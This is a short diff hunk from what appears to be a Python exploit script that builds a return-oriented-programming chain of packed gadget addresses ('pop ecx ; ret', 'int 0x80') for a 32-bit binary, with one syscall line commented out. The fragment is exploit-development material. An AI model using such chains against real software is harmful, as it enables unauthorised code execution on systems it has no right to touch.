@@ -112,7 +112,7 @@ p += pack('<I', 0x0812b35b) # pop ecx ; ret
 p += pack('<I', 0x08139090) # *newLine
 p += pack('<I', 0x0808522a) # pop edx ; ret
 p += pack('<I', 0x00000002) # @ length
-p += pack('<I', 0x08085cbf) # int 0x80
+#p += pack('<I', 0x08085cbf) # int 0x80
 # exit
 p += pack('<I', 0x080f1016) # pop eax ; ret
 p += pack('<I', 0x00000001) # 0x1
